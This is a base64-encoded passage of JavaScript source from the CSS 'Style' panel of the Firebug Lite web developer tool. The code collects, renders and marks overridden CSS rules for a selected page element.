DogJ3ByZXNlbnRhdGlvbid9LA0KICAgICAgICAgICAgICAgIERJVih7cm9sZSA6ICdsaXN0JywgJ2FyaWEtbGFiZWwnIDogJFNUUignYXJpYS5sYWJlbHMuc3R5bGUgcnVsZXMnKSB9LA0KICAgICAgICAgICAgICAgICAgICBGT1IoInJ1bGUiLCAiJHJ1bGVzIiwNCiAgICAgICAgICAgICAgICAgICAgICAgIFRBRygiJHJ1bGVUYWciLCB7cnVsZTogIiRydWxlIn0pDQogICAgICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICAgICApLA0KICAgICAgICAgICAgICAgIERJVih7cm9sZSA6ICJsaXN0IiwgJ2FyaWEtbGFiZWwnIDokU1RSKCdhcmlhLmxhYmVscy5pbmhlcml0ZWQgc3R5bGUgcnVsZXMnKX0sDQogICAgICAgICAgICAgICAgICAgIEZPUigic2VjdGlvbiIsICIkaW5oZXJpdGVkIiwNCiAgICAgICAgICAgICAgICAgICAgICAgIEgxKHsiY2xhc3MiOiAiY3NzSW5oZXJpdEhlYWRlciBncm91cEhlYWRlciBmb2N1c1JvdyIsIHJvbGUgOiAnbGlzdGl0ZW0nIH0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogImNzc0luaGVyaXRMYWJlbCJ9LCAiJGluaGVyaXRMYWJlbCIpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRBRyhGaXJlYnVnUmVwcy5FbGVtZW50LnNob3J0VGFnLCB7b2JqZWN0OiAiJHNlY3Rpb24uZWxlbWVudCJ9KQ0KICAgICAgICAgICAgICAgICAgICAgICAgKSwNCiAgICAgICAgICAgICAgICAgICAgICAgIERJVih7cm9sZSA6ICdncm91cCd9LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZPUigicnVsZSIsICIkc2VjdGlvbi5ydWxlcyIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRBRygiJHJ1bGVUYWciLCB7cnVsZTogIiRydWxlIn0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICApDQogICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICksDQoNCiAgICAgICAgcnVsZVRhZzoNCiAgICAgICAgICAgIGlzSUUgPw0KICAgICAgICAgICAgLy8gSUUgbmVlZHMgdGhlIHNvdXJjZUxpbmsgZmlyc3QsIG90aGVyd2lzZSBpdCB3aWxsIGJlIHJlbmRlcmVkIG91dHNpZGUgdGhlIHBhbmVsDQogICAgICAgICAgICBESVYoeyJjbGFzcyI6ICJjc3NFbGVtZW50UnVsZUNvbnRhaW5lciJ9LA0KICAgICAgICAgICAgICAgIFRBRyhGaXJlYnVnUmVwcy5Tb3VyY2VMaW5rLnRhZywge29iamVjdDogIiRydWxlLnNvdXJjZUxpbmsifSksDQogICAgICAgICAgICAgICAgVEFHKENTU1N0eWxlUnVsZVRhZy50YWcsIHtydWxlOiAiJHJ1bGUifSkgICAgICAgICAgICAgICAgDQogICAgICAgICAgICApDQogICAgICAgICAgICA6DQogICAgICAgICAgICAvLyBvdGhlciBicm93c2VycyBuZWVkIHRoZSBzb3VyY2VMaW5rIGxhc3QsIG90aGVyd2lzZSBpdCB3aWxsIGNhdXNlIGFuIGV4dHJhIHNwYWNlDQogICAgICAgICAgICAvLyBiZWZvcmUgdGhlIHJ1bGUgcmVwcmVzZW50YXRpb24NCiAgICAgICAgICAgIERJVih7ImNsYXNzIjogImNzc0VsZW1lbnRSdWxlQ29udGFpbmVyIn0sDQogICAgICAgICAgICAgICAgVEFHKENTU1N0eWxlUnVsZVRhZy50YWcsIHtydWxlOiAiJHJ1bGUifSksDQogICAgICAgICAgICAgICAgVEFHKEZpcmVidWdSZXBzLlNvdXJjZUxpbmsudGFnLCB7b2JqZWN0OiAiJHJ1bGUuc291cmNlTGluayJ9KQ0KICAgICAgICAgICAgKQ0KICAgIH0pLA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgdXBkYXRlQ2FzY2FkZVZpZXc6IGZ1bmN0aW9uKGVsZW1lbnQpDQogICAgew0KICAgICAgICAvL2Rpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbkJlZm9yZUNTU1J1bGVzQWRkZWQnLCBbdGhpc10pOw0KICAgICAgICB2YXIgcnVsZXMgPSBbXSwgc2VjdGlvbnMgPSBbXSwgdXNlZFByb3BzID0ge307DQogICAgICAgIHRoaXMuZ2V0SW5oZXJpdGVkUnVsZXMoZWxlbWVudCwgc2VjdGlvbnMsIHVzZWRQcm9wcyk7DQogICAgICAgIHRoaXMuZ2V0RWxlbWVudFJ1bGVzKGVsZW1lbnQsIHJ1bGVzLCB1c2VkUHJvcHMpOw0KDQogICAgICAgIGlmIChydWxlcy5sZW5ndGggfHwgc2VjdGlvbnMubGVuZ3RoKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaW5oZXJpdExhYmVsID0gIkluaGVyaXRlZCBmcm9tIjsgLy8gJFNUUigiSW5oZXJpdGVkRnJvbSIpOw0KICAgICAgICAgICAgdmFyIHJlc3VsdCA9IHRoaXMudGVtcGxhdGUuY2FzY2FkZWRUYWcucmVwbGFjZSh7cnVsZXM6IHJ1bGVzLCBpbmhlcml0ZWQ6IHNlY3Rpb25zLA0KICAgICAgICAgICAgICAgIGluaGVyaXRMYWJlbDogaW5oZXJpdExhYmVsfSwgdGhpcy5wYW5lbE5vZGUpOw0KICAgICAgICAgICAgLy9kaXNwYXRjaChbRmlyZWJ1Zy5BMTF5TW9kZWxdLCAnb25DU1NSdWxlc0FkZGVkJywgW3RoaXMsIHJlc3VsdF0pOw0KICAgICAgICB9DQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHJlc3VsdCA9IEZpcmVidWdSZXBzLldhcm5pbmcudGFnLnJlcGxhY2Uoe29iamVjdDogIkVtcHR5RWxlbWVudENTUyJ9LCB0aGlzLnBhbmVsTm9kZSk7DQogICAgICAgICAgICAvL2Rpc3BhdGNoKFtGaXJlYnVnLkExMXlNb2RlbF0sICdvbkNTU1J1bGVzQWRkZWQnLCBbdGhpcywgcmVzdWx0XSk7DQogICAgICAgIH0NCg0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyByZW1vdmUgd2hlbiB0aGVyZSB0aGUgZXh0ZXJuYWwgcmVzb3VyY2UgcHJvYmxlbSBpcyBmaXhlZA0KICAgICAgICBpZiAoQ3NzQW5hbHl6ZXIuaGFzRXh0ZXJuYWxTdHlsZVNoZWV0KCkpDQogICAgICAgICAgICBDc3NBbmFseXplci5leHRlcm5hbFN0eWxlU2hlZXRXYXJuaW5nLnRhZy5hcHBlbmQoew0KICAgICAgICAgICAgICAgIG9iamVjdDogIlRoZSByZXN1bHRzIGhlcmUgbWF5IGJlIGluYWNjdXJhdGUgYmVjYXVzZSBzb21lICIgKw0KICAgICAgICAgICAgICAgICAgICAgICAgInN0eWxlc2hlZXRzIGNvdWxkIG5vdCBiZSBsb2FkZWQgZHVlIHRvIGFjY2VzcyByZXN0cmljdGlvbnMuICIsDQogICAgICAgICAgICAgICAgbGluazogIm1vcmUuLi4iLA0KICAgICAgICAgICAgICAgIGhyZWY6ICJodHRwOi8vZ2V0ZmlyZWJ1Zy5jb20vd2lraS9pbmRleC5waHAvRmlyZWJ1Z19MaXRlX0ZBUSNJX2tlZXBfc2VlaW5nXy4yMlRoaXNfZWxlbWVudF9oYXNfbm9fc3R5bGVfcnVsZXMuMjIiDQogICAgICAgICAgICB9LCB0aGlzLnBhbmVsTm9kZSk7DQogICAgfSwNCg0KICAgIGdldFN0eWxlc2hlZXRVUkw6IGZ1bmN0aW9uKHJ1bGUpDQogICAgew0KICAgICAgICAvLyBpZiB0aGUgcGFyZW50U3R5bGVTaGVldC5ocmVmIGlzIG51bGwsIENTUyBzdGQgc2F5cyBpdHMgaW5saW5lIHN0eWxlLg0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBJRSBkb2Vzbid0IGhhdmUgcnVsZS5wYXJlbnRTdHlsZVNoZWV0IHNvIHdlIG11c3QgZmFsbCBiYWNrIHRvIHRoZSBkb2MubG9jYXRpb24NCiAgICAgICAgaWYgKHJ1bGUgJiYgcnVsZS5wYXJlbnRTdHlsZVNoZWV0ICYmIHJ1bGUucGFyZW50U3R5bGVTaGVldC5ocmVmKQ0KICAgICAgICAgICAgcmV0dXJuIHJ1bGUucGFyZW50U3R5bGVTaGVldC5ocmVmOw0KICAgICAgICBlbHNlDQogICAgICAgICAgICByZXR1cm4gdGhpcy5zZWxlY3Rpb24ub3duZXJEb2N1bWVudC5sb2NhdGlvbi5ocmVmOw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBnZXRJbmhlcml0ZWRSdWxlczogZnVuY3Rpb24oZWxlbWVudCwgc2VjdGlvbnMsIHVzZWRQcm9wcykNCiAgICB7DQogICAgICAgIHZhciBwYXJlbnQgPSBlbGVtZW50LnBhcmVudE5vZGU7DQogICAgICAgIGlmIChwYXJlbnQgJiYgcGFyZW50Lm5vZGVUeXBlID09IDEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRoaXMuZ2V0SW5oZXJpdGVkUnVsZXMocGFyZW50LCBzZWN0aW9ucywgdXNlZFByb3BzKTsNCg0KICAgICAgICAgICAgdmFyIHJ1bGVzID0gW107DQogICAgICAgICAgICB0aGlzLmdldEVsZW1lbnRSdWxlcyhwYXJlbnQsIHJ1bGVzLCB1c2VkUHJvcHMsIHRydWUpOw0KDQogICAgICAgICAgICBpZiAocnVsZXMubGVuZ3RoKQ0KICAgICAgICAgICAgICAgIHNlY3Rpb25zLnNwbGljZSgwLCAwLCB7ZWxlbWVudDogcGFyZW50LCBydWxlczogcnVsZXN9KTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBnZXRFbGVtZW50UnVsZXM6IGZ1bmN0aW9uKGVsZW1lbnQsIHJ1bGVzLCB1c2VkUHJvcHMsIGluaGVyaXRNb2RlKQ0KICAgIHsNCiAgICAgICAgdmFyIGluc3BlY3RlZFJ1bGVzLCBkaXNwbGF5ZWRSdWxlcyA9IHt9Ow0KICAgICAgICANCiAgICAgICAgaW5zcGVjdGVkUnVsZXMgPSBDc3NBbmFseXplci5nZXRFbGVtZW50Q1NTUnVsZXMoZWxlbWVudCk7DQoNCiAgICAgICAgaWYgKGluc3BlY3RlZFJ1bGVzKQ0KICAgICAgICB7DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMCwgbGVuZ3RoPWluc3BlY3RlZFJ1bGVzLmxlbmd0aDsgaSA8IGxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBydWxlSWQgPSBpbnNwZWN0ZWRSdWxlc1tpXTsNCiAgICAgICAgICAgICAgICB2YXIgcnVsZURhdGEgPSBDc3NBbmFseXplci5nZXRSdWxlRGF0YShydWxlSWQpOw0KICAgICAgICAgICAgICAgIHZhciBydWxlID0gcnVsZURhdGEucnVsZTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB2YXIgc3NpZCA9IHJ1bGVEYXRhLnN0eWxlU2hlZXRJZDsNCiAgICAgICAgICAgICAgICB2YXIgcGFyZW50U3R5bGVTaGVldCA9IFN0eWxlU2hlZXRDYWNoZS5nZXQoc3NpZCk7IA0KDQogICAgICAgICAgICAgICAgdmFyIGhyZWYgPSBwYXJlbnRTdHlsZVNoZWV0LmV4dGVybmFsVVJMID8gcGFyZW50U3R5bGVTaGVldC5leHRlcm5hbFVSTCA6IHBhcmVudFN0eWxlU2hlZXQuaHJlZjsgIC8vIE51bGwgbWVhbnMgaW5saW5lDQoNCiAgICAgICAgICAgICAgICB2YXIgaW5zdGFuY2UgPSBudWxsOw0KICAgICAgICAgICAgICAgIC8vdmFyIGluc3RhbmNlID0gZ2V0SW5zdGFuY2VGb3JTdHlsZVNoZWV0KHJ1bGUucGFyZW50U3R5bGVTaGVldCwgZWxlbWVudC5vd25lckRvY3VtZW50KTsNCg0KICAgICAgICAgICAgICAgIHZhciBpc1N5c3RlbVNoZWV0ID0gZmFsc2U7DQogICAgICAgICAgICAgICAgLy92YXIgaXNTeXN0ZW1TaGVldCA9IGlzU3lzdGVtU3R5bGVTaGVldChydWxlLnBhcmVudFN0eWxlU2hlZXQpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICghRmlyZWJ1Zy5zaG93VXNlckFnZW50Q1NTICYmIGlzU3lzdGVtU2hlZXQpIC8vIFRoaXMgcmVtb3ZlcyB1c2VyIGFnZW50IHJ1bGVzDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICghaHJlZikNCiAgICAgICAgICAgICAgICAgICAgaHJlZiA9IGVsZW1lbnQub3duZXJEb2N1bWVudC5sb2NhdGlvbi5ocmVmOyAvLyBodHRwOi8vY29kZS5nb29nbGUuY29tL3AvZmJ1Zy9pc3N1ZXMvZGV0YWlsP2lkPTQ1Mg0KDQogICAgICAgICAgICAgICAgdmFyIHByb3BzID0gdGhpcy5nZXRSdWxlUHJvcGVydGllcyh0aGlzLmNvbnRleHQsIHJ1bGUsIGluaGVyaXRNb2RlKTsNCiAgICAgICAgICAgICAgICBpZiAoaW5oZXJpdE1vZGUgJiYgIXByb3BzLmxlbmd0aCkNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQoNCiAgICAgICAgICAgICAgICAvLw0KICAgICAgICAgICAgICAgIC8vdmFyIGxpbmUgPSBkb21VdGlscy5nZXRSdWxlTGluZShydWxlKTsNCiAgICAgICAgICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBDU1MgbGluZSBudW1iZXIgDQogICAgICAgICAgICAgICAgdmFyIGxpbmUgPSBydWxlRGF0YS5saW5lTm87DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgdmFyIHJ1bGVJZCA9IHJ1bGUuc2VsZWN0b3JUZXh0KyIvIitsaW5lOw0KICAgICAgICAgICAgICAgIHZhciBzb3VyY2VMaW5rID0gbmV3IFNvdXJjZUxpbmsoaHJlZiwgbGluZSwgImNzcyIsIHJ1bGUsIGluc3RhbmNlKTsNCg0KICAgICAgICAgICAgICAgIHRoaXMubWFya092ZXJyaWRlblByb3BzKHByb3BzLCB1c2VkUHJvcHMsIGluaGVyaXRNb2RlKTsNCg0KICAgICAgICAgICAgICAgIHJ1bGVzLnNwbGljZSgwLCAwLCB7cnVsZTogcnVsZSwgaWQ6IHJ1bGVJZCwNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGVjdG9yOiBydWxlRGF0YS5zZWxlY3Rvciwgc291cmNlTGluazogc291cmNlTGluaywNCiAgICAgICAgICAgICAgICAgICAgICAgIHByb3BzOiBwcm9wcywgaW5oZXJpdGVkOiBpbmhlcml0TW9kZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGlzU3lzdGVtU2hlZXQ6IGlzU3lzdGVtU2hlZXR9KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChlbGVtZW50LnN0eWxlKQ0KICAgICAgICAgICAgdGhpcy5nZXRTdHlsZVByb3BlcnRpZXMoZWxlbWVudCwgcnVsZXMsIHVzZWRQcm9wcywgaW5oZXJpdE1vZGUpOw0KDQogICAgICAgIGlmIChGQlRyYWNlLkRCR19DU1MpDQogICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiZ2V0RWxlbWVudFJ1bGVzICIrcnVsZXMubGVuZ3RoKyIgcnVsZXMgZm9yICIrZ2V0RWxlbWVudFhQYXRoKGVsZW1lbnQpLCBydWxlcyk7DQogICAgfSwNCiAgICAvKg0KICAgIGdldEVsZW1lbnRSdWxlczogZnVuY3Rpb24oZWxlbWVudCwgcnVsZXMsIHVzZWRQcm9wcywgaW5oZXJpdE1vZGUpDQogICAgew0KICAgICAgICB2YXIgaW5zcGVjdGVkUnVsZXMsIGRpc3BsYXllZFJ1bGVzID0ge307DQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICBpbnNwZWN0ZWRSdWxlcyA9IGRvbVV0aWxzID8gZG9tVXRpbHMuZ2V0Q1NTU3R5bGVSdWxlcyhlbGVtZW50KSA6IG51bGw7DQogICAgICAgIH0gY2F0Y2ggKGV4Yykge30NCg0KICAgICAgICBpZiAoaW5zcGVjdGVkUnVsZXMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgaW5zcGVjdGVkUnVsZXMuQ291bnQoKTsgKytpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBydWxlID0gUUkoaW5zcGVjdGVkUnVsZXMuR2V0RWxlbWVudEF0KGkpLCBuc0lET01DU1NTdHlsZVJ1bGUpOw0KDQogICAgICAgICAgICAgICAgdmFyIGhyZWYgPSBydWxlLnBhcmVudFN0eWxlU2hlZXQuaHJlZjsgIC8vIE51bGwgbWVhbnMgaW5saW5lDQoNCiAgICAgICAgICAgICAgICB2YXIgaW5zdGFuY2UgPSBnZXRJbnN0YW5jZUZvclN0eWxlU2hlZXQocnVsZS5wYXJlbnRTdHlsZVNoZWV0LCBlbGVtZW50Lm93bmVyRG9jdW1lbnQpOw0KDQogICAgICAgICAgICAgICAgdmFyIGlzU3lzdGVtU2hlZXQgPSBpc1N5c3RlbVN0eWxlU2hlZXQocnVsZS5wYXJlbnRTdHlsZVNoZWV0KTsNCiAgICAgICAgICAgICAgICBpZiAoIUZpcmVidWcuc2hvd1VzZXJBZ2VudENTUyAmJiBpc1N5c3RlbVNoZWV0KSAvLyBUaGlzIHJlbW92ZXMgdXNlciBhZ2VudCBydWxlcw0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICBpZiAoIWhyZWYpDQogICAgICAgICAgICAgICAgICAgIGhyZWYgPSBlbGVtZW50Lm93bmVyRG9jdW1lbnQubG9jYXRpb24uaHJlZjsgLy8gaHR0cDovL2NvZGUuZ29vZ2xlLmNvbS9wL2ZidWcvaXNzdWVzL2RldGFpbD9pZD00NTINCg0KICAgICAgICAgICAgICAgIHZhciBwcm9wcyA9IHRoaXMuZ2V0UnVsZVByb3BlcnRpZXModGhpcy5jb250ZXh0LCBydWxlLCBpbmhlcml0TW9kZSk7DQogICAgICAgICAgICAgICAgaWYgKGluaGVyaXRNb2RlICYmICFwcm9wcy5sZW5ndGgpDQogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KDQogICAgICAgICAgICAgICAgdmFyIGxpbmUgPSBkb21VdGlscy5nZXRSdWxlTGluZShydWxlKTsNCiAgICAgICAgICAgICAgICB2YXIgcnVsZUlkID0gcnVsZS5zZWxlY3RvclRleHQrIi8iK2xpbmU7DQogICAgICAgICAgICAgICAgdmFyIHNvdXJjZUxpbmsgPSBuZXcgU291cmNlTGluayhocmVmLCBsaW5lLCAiY3NzIiwgcnVsZSwgaW5zdGFuY2UpOw0KDQogICAgICAgICAgICAgICAgdGhpcy5tYXJrT3ZlcnJpZGVuUHJvcHMocHJvcHMsIHVzZWRQcm9wcywgaW5oZXJpdE1vZGUpOw0KDQogICAgICAgICAgICAgICAgcnVsZXMuc3BsaWNlKDAsIDAsIHtydWxlOiBydWxlLCBpZDogcnVsZUlkLA0KICAgICAgICAgICAgICAgICAgICAgICAgc2VsZWN0b3I6IHJ1bGUuc2VsZWN0b3JUZXh0LCBzb3VyY2VMaW5rOiBzb3VyY2VMaW5rLA0KICAgICAgICAgICAgICAgICAgICAgICAgcHJvcHM6IHByb3BzLCBpbmhlcml0ZWQ6IGluaGVyaXRNb2RlLA0KICAgICAgICAgICAgICAgICAgICAgICAgaXNTeXN0ZW1TaGVldDogaXNTeXN0ZW1TaGVldH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKGVsZW1lbnQuc3R5bGUpDQogICAgICAgICAgICB0aGlzLmdldFN0eWxlUHJvcGVydGllcyhlbGVtZW50LCBydWxlcywgdXNlZFByb3BzLCBpbmhlcml0TW9kZSk7DQoNCiAgICAgICAgaWYgKEZCVHJhY2UuREJHX0NTUykNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJnZXRFbGVtZW50UnVsZXMgIitydWxlcy5sZW5ndGgrIiBydWxlcyBmb3IgIitnZXRFbGVtZW50WFBhdGgoZWxlbWVudCksIHJ1bGVzKTsNCiAgICB9LA0KICAgIC8qKi8NCiAgICBtYXJrT3ZlcnJpZGVuUHJvcHM6IGZ1bmN0aW9uKHByb3BzLCB1c2VkUHJvcHMsIGluaGVyaXRNb2RlKQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBwcm9wcy5sZW5ndGg7ICsraSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHByb3AgPSBwcm9wc1tpXTsNCiAgICAgICAgICAgIGlmICggdXNlZFByb3BzLmhhc093blByb3BlcnR5KHByb3AubmFtZSkgKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBkZWFkUHJvcHMgPSB1c2VkUHJvcHNbcHJvcC5uYW1lXTsgLy8gYWxsIHByZXZpb3VzIG9jY3VycmVuY2VzIG9mIHRoaXMgcHJvcGVydHkNCiAgICAgICAgICAgICAgICBmb3IgKHZhciBqID0gMDsgaiA8IGRlYWRQcm9wcy5sZW5ndGg7ICsraikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBkZWFkUHJvcCA9IGRlYWRQcm9wc1tqXTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCFkZWFkUHJvcC5kaXNhYmxlZCAmJiAhZGVhZFByb3Aud2FzSW5oZXJpdGVkICYmIGRlYWRQcm9wLmltcG9ydGFudCAmJiAhcHJvcC5pbXBvcnRhbnQpDQogICAgICAgICAgICAgICAgICAgICAgICBwcm9wLm92ZXJyaWRkZW4gPSB0cnVlOyAgLy8gbmV3IG9jY3VycmVuY2Ugb3ZlcnJpZGRlbg0KICAgICAgICAgICAgICAgICAgICBlbHNlIGlmICghcHJvcC5kaXNhYmxlZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGRlYWRQcm9wLm92ZXJyaWRkZW4gPSB0cnVlOyAgLy8gcHJldmlvdXMgb2NjdXJyZW5jZXMgb3ZlcnJpZGRlbg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB1c2VkUHJvcHNbcHJvcC5uYW1lXSA9IFtdOw0KDQogICAgICAgICAgICBwcm9wLndhc0luaGVyaXRlZCA9IGluaGVyaXRNb2RlID8gdHJ1ZSA6IGZhbHNlOw0KICAgICAgICAgICAgdXNlZFByb3BzW3Byb3AubmFtZV0ucHVzaChwcm9wKTsgIC8vIGFsbCBvY2N1cnJlbmNlcyBvZiBhIHByb3BlcnR5IHNlZW4gc28gZmFyLCBieSBuYW1lDQogICAgICAgIH0NCiAgICB9LA0KDQogICAgZ2V0U3R5bGVQcm9wZXJ0aWVzOiBmdW5jdGlvbihlbGVtZW50LCBydWxlcywgdXNlZFByb3BzLCBpbmhlcml0TW9kZSkNCiAgICB7DQogICAgICAgIHZhciBwcm9wcyA9IHRoaXMucGFyc2VDU1NQcm9wcyhlbGVtZW50LnN0eWxlLCBpbmhlcml0TW9kZSk7DQogICAgICAgIHRoaXMuYWRkT2xkUHJvcGVydGllcyh0aGlzLmNvbnRleHQsIGdldEVsZW1lbnRYUGF0aChlbGVtZW50KSwgaW5oZXJpdE1vZGUsIHByb3BzKTsNCg0KICAgICAgICBzb3J0UHJvcGVydGllcyhwcm9wcyk7DQogICAgICAgIHRoaXMubWFya092ZXJyaWRlblByb3BzKHByb3BzLCB1c2VkUHJvcHMsIGluaGVyaXRNb2RlKTsNCg0KICAgICAgICBpZiAocHJvcHMubGVuZ3RoKQ0KICAgICAgICAgICAgcnVsZXMuc3BsaWNlKDAsIDAsDQogICAgICAgICAgICAgICAgICAgIHtydWxlOiBlbGVtZW50LCBpZDogZ2V0RWxlbWVudFhQYXRoKGVsZW1lbnQpLA0KICAgICAgICAgICAgICAgICAgICAgICAgc2VsZWN0b3I6ICJlbGVtZW50LnN0eWxlIiwgcHJvcHM6IHByb3BzLCBpbmhlcml0ZWQ6IGluaGVyaXRNb2RlfSk7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBleHRlbmRzIFBhbmVsDQoNCiAgICBuYW1lOiAiY3NzIiwNCiAgICB0aXRsZTogIlN0eWxlIiwNCiAgICBwYXJlbnRQYW5lbDogIkhUTUwiLA0KICAgIG9yZGVyOiAwLA0KDQogICAgaW5pdGlhbGl6ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdGhpcy5jb250ZXh0ID0gRmlyZWJ1Zy5jaHJvbWU7IC8vIFRPRE86IHh4eHBlZHJvIGNzczINCiAgICAgICAgdGhpcy5kb2N1bWVudCA9IEZpcmVidWcuY2hyb21lLmRvY3VtZW50OyAvLyBUT0RPOiB4eHhwZWRybyBjc3MyDQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLkNTU1N0eWxlU2hlZXRQYW5lbC5wcm90b3R5cGUuaW5pdGlhbGl6ZS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgICAgICANCiAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gY3NzMg0KICAgICAgICB2YXIgc2VsZWN0aW9uID0gRWxlbWVudENhY2hlLmdldChGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuc2VsZWN0ZWRIVE1MRWxlbWVudElkKTsNCiAgICAgICAgaWYgKHNlbGVjdGlvbikNCiAgICAgICAgICAgIHRoaXMuc2VsZWN0KHNlbGVjdGlvbiwgdHJ1ZSk7DQogICAgICAgIA0KICAgICAgICAvL3RoaXMudXBkYXRlQ2FzY2FkZVZpZXcoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImgxIilbMF0pOw0KICAgICAgICAvL3RoaXMudXBkYXRlQ2FzY2FkZVZpZXcoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImJ1aWxkIikpOw0KICAgICAgICANCiAgICAgICAgLyoNCiAgICAgICAgdGhpcy5vblN0YXRlQ2hhbmdlID0gYmluZEZpeGVkKHRoaXMuY29udGVudFN0YXRlQ2hlY2ssIHRoaXMpOw0KICAgICAgICB0aGlzLm9uSG92ZXJDaGFuZ2UgPSBiaW5kRml4ZWQodGhpcy5jb250ZW50U3RhdGVDaGVjaywgdGhpcywgU1RBVEVfSE9WRVIpOw0KICAgICAgICB0aGlzLm9uQWN0aXZlQ2hhbmdlID0gYmluZEZpeGVkKHRoaXMuY29udGVudFN0YXRlQ2hlY2ssIHRoaXMsIFNUQVRFX0FDVElWRSk7DQogICAgICAgIC8qKi8NCiAgICB9LA0KDQogICAgaXNob3c6IGZ1bmN0aW9uKHN0YXRlKQ0KICAgIHsNCiAgICB9LA0KDQogICAgd2F0Y2hXaW5kb3c6IGZ1bmN0aW9uKHdpbikNCiAgICB7DQogICAgICAgIGlmIChkb21VdGlscykNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gTm9ybWFsbHkgdGhlc2Ugd291bGQgbm90IGJlIHJlcXVpcmVkLCBidXQgaW4gb3JkZXIgdG8gdXBkYXRlIGFmdGVyIHRoZSBzdGF0ZSBpcyBzZXQNCiAgICAgICAgICAgIC8vIHVzaW5nIHRoZSBvcHRpb25zIG1lbnUgd2UgbmVlZCB0byBtb25pdG9yIHRoZXNlIGdsb2JhbCBldmVudHMgYXMgd2VsbA0KICAgICAgICAgICAgdmFyIGRvYyA9IHdpbi5kb2N1bWVudDsNCiAgICAgICAgICAgIC8vL2FkZEV2ZW50KGRvYywgIm1vdXNlb3ZlciIsIHRoaXMub25Ib3ZlckNoYW5nZSk7DQogICAgICAgICAgICAvLy9hZGRFdmVudChkb2MsICJtb3VzZWRvd24iLCB0aGlzLm9uQWN0aXZlQ2hhbmdlKTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgdW53YXRjaFdpbmRvdzogZnVuY3Rpb24od2luKQ0KICAgIHsNCiAgICAgICAgdmFyIGRvYyA9IHdpbi5kb2N1bWVudDsNCiAgICAgICAgLy8vcmVtb3ZlRXZlbnQoZG9jLCAibW91c2VvdmVyIiwgdGhpcy5vbkhvdmVyQ2hhbmdlKTsNCiAgICAgICAgLy8vcmVtb3ZlRXZlbnQoZG9jLCAibW91c2Vkb3duIiwgdGhpcy5vbkFjdGl2ZUNoYW5nZSk7DQoNCiAgICAgICAgaWYgKGlzQW5jZXN0b3IodGhpcy5zdGF0ZUNoYW5nZUVsLCBkb2MpKQ0KICAgICAgICB7DQogICAgICAgICAgICB0aGlzLnJlbW92ZVN0YXRlQ2hhbmdlSGFuZGxlcnMoKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICBzdXBwb3J0c09iamV